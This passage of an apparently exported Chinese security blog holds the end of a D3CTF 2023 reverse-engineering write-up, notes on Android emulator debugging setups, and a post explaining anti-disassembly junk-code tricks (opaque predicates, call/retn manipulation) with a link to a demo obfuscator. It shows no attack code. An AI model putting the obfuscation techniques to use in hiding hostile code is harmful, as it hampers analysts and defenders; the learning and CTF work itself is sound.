title="那也可以硬调吧，不妨碍，既然他能运行那姑且也可以调"></a>那也可以硬调吧，不妨碍，既然他能运行那姑且也可以调</h5><p><img src="/2023/07/11/d3ctf-2023/image-20230711200137667.png" alt="image-20230711200137667"></p>
<h5 id="调dll的确实…不知道谁也出过类似的恶心题目"><a href="#调dll的确实…不知道谁也出过类似的恶心题目" class="headerlink" title="调dll的确实…不知道谁也出过类似的恶心题目"></a>调dll的确实…<del>不知道谁也出过类似的恶心题目</del></h5><h5 id="但是主逻辑有了的，下面isdebuggerpresent给他拿掉，这里主要是V0没有识别出来，跳转的时候没有找到jmp的位置，否则不会有那么多逃逸变量…"><a href="#但是主逻辑有了的，下面isdebuggerpresent给他拿掉，这里主要是V0没有识别出来，跳转的时候没有找到jmp的位置，否则不会有那么多逃逸变量…" class="headerlink" title="但是主逻辑有了的，下面isdebuggerpresent给他拿掉，这里主要是V0没有识别出来，跳转的时候没有找到jmp的位置，否则不会有那么多逃逸变量…"></a>但是主逻辑有了的，下面<code>isdebuggerpresent</code>给他拿掉，这里主要是V0没有识别出来，跳转的时候没有找到jmp的位置，否则不会有那么多逃逸变量…</h5><h5 id="勉强可以辨认这里修改的表"><a href="#勉强可以辨认这里修改的表" class="headerlink" title="勉强可以辨认这里修改的表"></a>勉强可以辨认这里修改的表</h5><h5 id="回到main里，实际操作也就这里面："><a href="#回到main里，实际操作也就这里面：" class="headerlink" title="回到main里，实际操作也就这里面："></a>回到main里，实际操作也就这里面：</h5><p><img src="/2023/07/11/d3ctf-2023/image-20230711200826897.png" alt="image-20230711200826897"></p>
<h5 id="byte-405060刚才在dll已经走过了，差这个flag表，应当在这里走走："><a href="#byte-405060刚才在dll已经走过了，差这个flag表，应当在这里走走：" class="headerlink" title="byte_405060刚才在dll已经走过了，差这个flag表，应当在这里走走："></a><code>byte_405060</code>刚才在dll已经走过了，差这个flag表，应当在这里走走：</h5><p><img src="/2023/07/11/d3ctf-2023/image-20230711201100046.png" alt="image-20230711201100046"></p>
<h5 id="再往前推么发现跟v12有关，于是牵扯到了sub-40216A，这里确实确实看不懂了，即使出题人好心没去结构体的符号表…"><a href="#再往前推么发现跟v12有关，于是牵扯到了sub-40216A，这里确实确实看不懂了，即使出题人好心没去结构体的符号表…" class="headerlink" title="再往前推么发现跟v12有关，于是牵扯到了sub_40216A，这里确实确实看不懂了，即使出题人好心没去结构体的符号表…"></a>再往前推么发现跟v12有关，于是牵扯到了<code>sub_40216A</code>，这里确实确实看不懂了，即使出题人好心没去结构体的符号表…</h5><h5 id="先说结论，这里是大整数分解。其次，看的别人的wp知道的"><a href="#先说结论，这里是大整数分解。其次，看的别人的wp知道的" class="headerlink" title="先说结论，这里是大整数分解。其次，看的别人的wp知道的"></a>先说结论，这里是大整数分解。其次，看的别人的wp知道的</h5><h5 id="结论是这里把换后的表带入大整数分解，得到的两段拼接起来是flag…"><a href="#结论是这里把换后的表带入大整数分解，得到的两段拼接起来是flag…" class="headerlink" title="结论是这里把换后的表带入大整数分解，得到的两段拼接起来是flag…"></a>结论是这里把换后的表带入大整数分解，得到的两段拼接起来是flag…</h5><h6 id="合着练了一下动调……实话说目前算是做不出来这个题的……"><a href="#合着练了一下动调……实话说目前算是做不出来这个题的……" class="headerlink" title="合着练了一下动调……实话说目前算是做不出来这个题的……"></a>合着练了一下动调……实话说目前算是做不出来这个题的……</h6><h6 id="嗯，天堂之门有空来写一个试试…-参考-原创-天堂之门-Heaven’s-Gate-C语言实现-软件逆向-看雪-安全社区-安全招聘-kanxue-com"><a href="#嗯，天堂之门有空来写一个试试…-参考-原创-天堂之门-Heaven’s-Gate-C语言实现-软件逆向-看雪-安全社区-安全招聘-kanxue-com" class="headerlink" title="嗯，天堂之门有空来写一个试试…[参考]([原创]天堂之门 (Heaven’s Gate) C语言实现-软件逆向-看雪-安全社区|安全招聘|kanxue.com)"></a>嗯，天堂之门有空来写一个试试…[参考]([<a href="https://bbs.kanxue.com/thread-270153.htm">原创]天堂之门 (Heaven’s Gate) C语言实现-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a>)</h6><h6 id="结论，有经验的话就不算难题，但是初见还挺可怕的"><a href="#结论，有经验的话就不算难题，但是初见还挺可怕的" class="headerlink" title="结论，有经验的话就不算难题，但是初见还挺可怕的"></a>结论，有经验的话就不算难题，但是初见还挺可怕的</h6><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
  </entry>
  <entry>
    <title>安卓调试初探</title>
    <url>/2023/07/11/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface：说是初探，也不是很初探吧其实，前面多多少少弄过完整的流程了，但是由于hyperV这玄学东西后面搞的环境一团糟，打算还是重新弄一个完整的调试方案出来，顺便记录一些基础知识"><a href="#preface：说是初探，也不是很初探吧其实，前面多多少少弄过完整的流程了，但是由于hyperV这玄学东西后面搞的环境一团糟，打算还是重新弄一个完整的调试方案出来，顺便记录一些基础知识" class="headerlink" title="preface：说是初探，也不是很初探吧其实，前面多多少少弄过完整的流程了，但是由于hyperV这玄学东西后面搞的环境一团糟，打算还是重新弄一个完整的调试方案出来，顺便记录一些基础知识"></a>preface：说是初探，也不是很初探吧其实，前面多多少少弄过完整的流程了，但是由于hyperV这玄学东西后面搞的环境一团糟，打算还是重新弄一个完整的调试方案出来，顺便记录一些基础知识</h6><span id="more"></span>

<h6 id="初学配安卓环境挺痛苦的，有几大原因：还没准备可以root的真机；在x86架构下跑arm的方案很少，流畅的更少；能比较流畅运行的大多是商业模拟器，但是我的本地linux环境大多放在wsl2上，商业模拟器很多与wsl2的hyperV冲突"><a href="#初学配安卓环境挺痛苦的，有几大原因：还没准备可以root的真机；在x86架构下跑arm的方案很少，流畅的更少；能比较流畅运行的大多是商业模拟器，但是我的本地linux环境大多放在wsl2上，商业模拟器很多与wsl2的hyperV冲突" class="headerlink" title="初学配安卓环境挺痛苦的，有几大原因：还没准备可以root的真机；在x86架构下跑arm的方案很少，流畅的更少；能比较流畅运行的大多是商业模拟器，但是我的本地linux环境大多放在wsl2上，商业模拟器很多与wsl2的hyperV冲突"></a>初学配安卓环境挺痛苦的，有几大原因：还没准备可以root的真机；在x86架构下跑arm的方案很少，流畅的更少；能比较流畅运行的大多是商业模拟器，但是我的本地linux环境大多放在wsl2上，商业模拟器很多与wsl2的hyperV冲突</h6><h5 id="几个尝试过或可以考虑的方案："><a href="#几个尝试过或可以考虑的方案：" class="headerlink" title="几个尝试过或可以考虑的方案："></a>几个尝试过或可以考虑的方案：</h5><table>
<thead>
<tr>
<th align="center">Android Studio</th>
<th align="center">mumu12</th>
<th align="center">qemu</th>
<th align="center">真机</th>
</tr>
</thead>
<tbody><tr>
<td align="center">选择多</td>
<td align="center">使用方便</td>
<td align="center">配置麻烦</td>
<td align="center">准备尝试</td>
</tr>
</tbody></table>
<h5 id="1、Android-Studio"><a href="#1、Android-Studio" class="headerlink" title="1、Android Studio"></a>1、Android Studio</h5><h5 id="在so有x86支持时为比较优解，可以随意选择安卓版本来使用。仅支持arm时本机能成功运行的镜像仅有：armeabi-v7a的Nougat，但很多新的apk都是arm64-v8a，这里本机跑会报很多错，而且很慢很慢"><a href="#在so有x86支持时为比较优解，可以随意选择安卓版本来使用。仅支持arm时本机能成功运行的镜像仅有：armeabi-v7a的Nougat，但很多新的apk都是arm64-v8a，这里本机跑会报很多错，而且很慢很慢" class="headerlink" title="在so有x86支持时为比较优解，可以随意选择安卓版本来使用。仅支持arm时本机能成功运行的镜像仅有：armeabi-v7a的Nougat，但很多新的apk都是arm64-v8a，这里本机跑会报很多错，而且很慢很慢"></a>在so有x86支持时为比较优解，可以随意选择安卓版本来使用。仅支持arm时本机能成功运行的镜像仅有：<img src="/2023/07/11/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/image-20230811134825647.png" alt="image-20230811134825647">armeabi-v7a的Nougat，但很多新的apk都是arm64-v8a，这里本机跑会报很多错，而且很慢很慢</h5><h5 id="2、正常情况下可以用nox或者雷电模拟器，稳定性还行，但是有wsl2的情况下会出奇怪问题（雷电号称是有兼容的，但是实测用起来会卡死，懒得修了直接换个）之前一直用的mumux，但是这两天连adb会触发强制更新，换成mumu12居然还可以用，属于比较惊喜的，在真机拿到前可以先用这个方案"><a href="#2、正常情况下可以用nox或者雷电模拟器，稳定性还行，但是有wsl2的情况下会出奇怪问题（雷电号称是有兼容的，但是实测用起来会卡死，懒得修了直接换个）之前一直用的mumux，但是这两天连adb会触发强制更新，换成mumu12居然还可以用，属于比较惊喜的，在真机拿到前可以先用这个方案" class="headerlink" title="2、正常情况下可以用nox或者雷电模拟器，稳定性还行，但是有wsl2的情况下会出奇怪问题（雷电号称是有兼容的，但是实测用起来会卡死，懒得修了直接换个）之前一直用的mumux，但是这两天连adb会触发强制更新，换成mumu12居然还可以用，属于比较惊喜的，在真机拿到前可以先用这个方案"></a>2、正常情况下可以用nox或者雷电模拟器，稳定性还行，但是有wsl2的情况下会出奇怪问题（雷电号称是有兼容的，但是实测用起来会卡死，懒得修了直接换个）之前一直用的mumux，但是这两天连adb会触发强制更新，换成mumu12居然还可以用，属于比较惊喜的，在真机拿到前可以先用这个方案</h5><h5 id="mumu12用的x86的架构，但是实测是可以跑arm64-v8a的，具体原理不太懂，但是确实挺好用的，可以按照这篇操作，调试so层"><a href="#mumu12用的x86的架构，但是实测是可以跑arm64-v8a的，具体原理不太懂，但是确实挺好用的，可以按照这篇操作，调试so层" class="headerlink" title="mumu12用的x86的架构，但是实测是可以跑arm64-v8a的，具体原理不太懂，但是确实挺好用的，可以按照这篇操作，调试so层"></a>mumu12用的x86的架构，但是实测是可以跑arm64-v8a的，具体原理不太懂，但是确实挺好用的，可以按照这篇操作，调试so层</h5><p><a href="https://www.cnblogs.com/ddms/p/8820044.html">IDA远程调试Android中so文件 - jKing777 - 博客园 (cnblogs.com)</a></p>
<h5 id="3、qemu"><a href="#3、qemu" class="headerlink" title="3、qemu"></a>3、qemu</h5><h5 id="搭建很麻烦，实际也不好用（AS也是基于qemu的）"><a href="#搭建很麻烦，实际也不好用（AS也是基于qemu的）" class="headerlink" title="搭建很麻烦，实际也不好用（AS也是基于qemu的）"></a>搭建很麻烦，实际也不好用（AS也是基于qemu的）</h5><h5 id="4、真机"><a href="#4、真机" class="headerlink" title="4、真机"></a>4、真机</h5><h5 id="理论上的最优解，但是不知道比起商业模拟器优多少呢"><a href="#理论上的最优解，但是不知道比起商业模拟器优多少呢" class="headerlink" title="理论上的最优解，但是不知道比起商业模拟器优多少呢"></a>理论上的最优解，但是不知道比起商业模拟器优多少呢</h5>]]></content>
  </entry>
  <entry>
    <title>junk code demo</title>
    <url>/2023/07/18/junk-code-demo/</url>
    <content><![CDATA[<h6 id="大概是二三月份遇到了一个题出了一个有点意思的花，想着可以看看，对应这种花写了个简单的源码随机加花器。不是什么高深的技术，但是也顺便把IDA这类线性扫描反汇编和递归下降反汇编弄清楚点，以后IDA抽风的时候也更清楚点为啥"><a href="#大概是二三月份遇到了一个题出了一个有点意思的花，想着可以看看，对应这种花写了个简单的源码随机加花器。不是什么高深的技术，但是也顺便把IDA这类线性扫描反汇编和递归下降反汇编弄清楚点，以后IDA抽风的时候也更清楚点为啥" class="headerlink" title="大概是二三月份遇到了一个题出了一个有点意思的花，想着可以看看，对应这种花写了个简单的源码随机加花器。不是什么高深的技术，但是也顺便把IDA这类线性扫描反汇编和递归下降反汇编弄清楚点，以后IDA抽风的时候也更清楚点为啥"></a>大概是二三月份遇到了一个题出了一个有点意思的花，想着可以看看，对应这种花写了个简单的源码随机加花器。不是什么高深的技术，但是也顺便把IDA这类线性扫描反汇编和递归下降反汇编弄清楚点，<del>以后IDA抽风的时候也更清楚点为啥</del></h6><span id="more"></span>

<h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><h6 id="来源于-IDAPro权威指南"><a href="#来源于-IDAPro权威指南" class="headerlink" title="来源于 IDAPro权威指南"></a>来源于 IDAPro权威指南</h6><h5>
<details> <summary>线性扫描反汇编</summary>

<p><img src="/2023/07/18/junk-code-demo/image-20230718011401924.png" alt="image-20230718011401924"></p>
</details>
</h5>

<h5>
<details> <summary>递归下降反汇编</summary>

<p><img src="/2023/07/18/junk-code-demo/image-20230718011457626.png" alt="image-20230718011457626"></p>
<p><img src="/2023/07/18/junk-code-demo/image-20230718011531171.png" alt="image-20230718011531171"></p>
<p><img src="/2023/07/18/junk-code-demo/image-20230718011544013.png" alt="image-20230718011544013"></p>
</details>
</h5>

<h5 id="这里主要看递归下降反汇编方式"><a href="#这里主要看递归下降反汇编方式" class="headerlink" title="这里主要看递归下降反汇编方式"></a>这里主要看递归下降反汇编方式</h5><h5 id="首先明确IDAPro的反汇编均为静态进行。根据条件分支指令可以构造入门的junk-instructions如-jz-jnz-或者永真-x2F-假条件-jz-x2F-jnz类型（注意：后者在构造时需要考虑编译器优化问题）"><a href="#首先明确IDAPro的反汇编均为静态进行。根据条件分支指令可以构造入门的junk-instructions如-jz-jnz-或者永真-x2F-假条件-jz-x2F-jnz类型（注意：后者在构造时需要考虑编译器优化问题）" class="headerlink" title="首先明确IDAPro的反汇编均为静态进行。根据条件分支指令可以构造入门的junk instructions如(jz+jnz)或者永真&#x2F;假条件+jz&#x2F;jnz类型（注意：后者在构造时需要考虑编译器优化问题）"></a>首先明确IDAPro的反汇编均为静态进行。根据条件分支指令可以构造入门的junk instructions如(jz+jnz)或者永真&#x2F;假条件+jz&#x2F;jnz类型（注意：后者在构造时需要考虑编译器优化问题）</h5><h5 id="实际上，根据上面这个跳转问题，就可以构造一种花，在虚假的控制流中间加入诸如破坏栈帧的junk-code，导致反编译失败。不过实践应该是没什么用的，毕竟去虚假控制流的最常见思路就是模拟动态执行，顺带就把花拿下了：）"><a href="#实际上，根据上面这个跳转问题，就可以构造一种花，在虚假的控制流中间加入诸如破坏栈帧的junk-code，导致反编译失败。不过实践应该是没什么用的，毕竟去虚假控制流的最常见思路就是模拟动态执行，顺带就把花拿下了：）" class="headerlink" title="实际上，根据上面这个跳转问题，就可以构造一种花，在虚假的控制流中间加入诸如破坏栈帧的junk code，导致反编译失败。不过实践应该是没什么用的，毕竟去虚假控制流的最常见思路就是模拟动态执行，顺带就把花拿下了：）"></a>实际上，根据上面这个跳转问题，就可以构造一种花，在虚假的控制流中间加入诸如破坏栈帧的junk code，导致反编译失败。不过实践应该是没什么用的，毕竟去虚假控制流的最常见思路就是模拟动态执行，顺带就把花拿下了：）</h5><h5 id="如果能理解这个最基本的例子原理，大概可以找到一种构造反汇编的通式：用构造永真条件跳转逻辑，在产生的虚假的控制流中塞入junk-code，使得反汇编失效"><a href="#如果能理解这个最基本的例子原理，大概可以找到一种构造反汇编的通式：用构造永真条件跳转逻辑，在产生的虚假的控制流中塞入junk-code，使得反汇编失效" class="headerlink" title="如果能理解这个最基本的例子原理，大概可以找到一种构造反汇编的通式：用构造永真条件跳转逻辑，在产生的虚假的控制流中塞入junk code，使得反汇编失效"></a>如果能理解这个最基本的例子原理，大概可以找到一种构造反汇编的通式：<code>用构造永真条件跳转逻辑，在产生的虚假的控制流中塞入junk code，使得反汇编失效</code></h5><h5 id="然后，配合一些小小的汇编知识，就可以产生奇妙的效果"><a href="#然后，配合一些小小的汇编知识，就可以产生奇妙的效果" class="headerlink" title="然后，配合一些小小的汇编知识，就可以产生奇妙的效果"></a>然后，配合一些小小的汇编知识，就可以产生奇妙的效果</h5><h5 id="例如，call指令正常情况下不会指向其他call-retn间的地址，但通过asm汇编内联，可以让call指向一个最近的相对地址，同时-不维护条件寄存器-，通过该条件寄存器控制永真逻辑。当调用retn的时候返回call，下面的条件寄存器会重复修改。中间的代码在IDA优化过程中是假逻辑，但构造运行两次后变为永真。（-可能有点抽象，这里写了个小demo-junkCode-x2F-README-md-at-main-·-DeMoYao100-x2F-junkCode-github-com"><a href="#例如，call指令正常情况下不会指向其他call-retn间的地址，但通过asm汇编内联，可以让call指向一个最近的相对地址，同时-不维护条件寄存器-，通过该条件寄存器控制永真逻辑。当调用retn的时候返回call，下面的条件寄存器会重复修改。中间的代码在IDA优化过程中是假逻辑，但构造运行两次后变为永真。（-可能有点抽象，这里写了个小demo-junkCode-x2F-README-md-at-main-·-DeMoYao100-x2F-junkCode-github-com" class="headerlink" title="例如，call指令正常情况下不会指向其他call retn间的地址，但通过asm汇编内联，可以让call指向一个最近的相对地址，同时__不维护条件寄存器__，通过该条件寄存器控制永真逻辑。当调用retn的时候返回call，下面的条件寄存器会重复修改。中间的代码在IDA优化过程中是假逻辑，但构造运行两次后变为永真。（[可能有点抽象，这里写了个小demo](junkCode&#x2F;README.md at main · DeMoYao100&#x2F;junkCode (github.com))"></a>例如，call指令正常情况下不会指向其他call retn间的地址，但通过asm汇编内联，可以让call指向一个最近的相对地址，同时__不维护条件寄存器__，通过该条件寄存器控制永真逻辑。当调用retn的时候返回call，下面的条件寄存器会重复修改。中间的代码在IDA优化过程中是假逻辑，但构造运行两次后变为永真。（[可能有点抽象，这里写了个小demo](<a href="https://github.com/DeMoYao100/junkCode">junkCode&#x2F;README.md at main · DeMoYao100&#x2F;junkCode (github.com)</a>)</h5><h5 id="其实基本上看懂这个demo，就能搞明白上面这个通式了，这里修改寄存器、或者其它构造虚假控制流的方法可就多种多样了（疑似是之前看过构造rop链劫持控制流的题，无心之举导致的反编译失效）也没必要深究，遇到之后再分析就行"><a href="#其实基本上看懂这个demo，就能搞明白上面这个通式了，这里修改寄存器、或者其它构造虚假控制流的方法可就多种多样了（疑似是之前看过构造rop链劫持控制流的题，无心之举导致的反编译失效）也没必要深究，遇到之后再分析就行" class="headerlink" title="其实基本上看懂这个demo，就能搞明白上面这个通式了，这里修改寄存器、或者其它构造虚假控制流的方法可就多种多样了（疑似是之前看过构造rop链劫持控制流的题，无心之举导致的反编译失效）也没必要深究，遇到之后再分析就行"></a>其实基本上看懂这个demo，就能搞明白上面这个通式了，这里修改寄存器、或者其它构造虚假控制流的方法可就多种多样了（疑似是之前看过构造rop链劫持控制流的题，无心之举导致的反编译失效）也没必要深究，遇到之后再分析就行</h5><h5 id="然后是函数指针篡改，感觉一出现ida很容易抽风，基本上就是动调的时候修就行（除非恶意构造）"><a href="#然后是函数指针篡改，感觉一出现ida很容易抽风，基本上就是动调的时候修就行（除非恶意构造）" class="headerlink" title="然后是函数指针篡改，感觉一出现ida很容易抽风，基本上就是动调的时候修就行（除非恶意构造）"></a>然后是函数指针篡改，感觉一出现ida很容易抽风，基本上就是动调的时候修就行（除非恶意构造）</h5><h6 id="最后立个flag，有空把IDA反编译也写一篇ida反编译是真喜欢抽风啊。虽然这俩并不是啥必要学的东西，也不难，但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助"><a href="#最后立个flag，有空把IDA反编译也写一篇ida反编译是真喜欢抽风啊。虽然这俩并不是啥必要学的东西，也不难，但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助" class="headerlink" title="最后立个flag，有空把IDA反编译也写一篇ida反编译是真喜欢抽风啊。虽然这俩并不是啥必要学的东西，也不难，但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助"></a>最后立个flag，有空把IDA反编译也写一篇<del>ida反编译是真喜欢抽风啊</del>。虽然这俩并不是啥必要学的东西，也不难，但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助</h6>]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
</search>
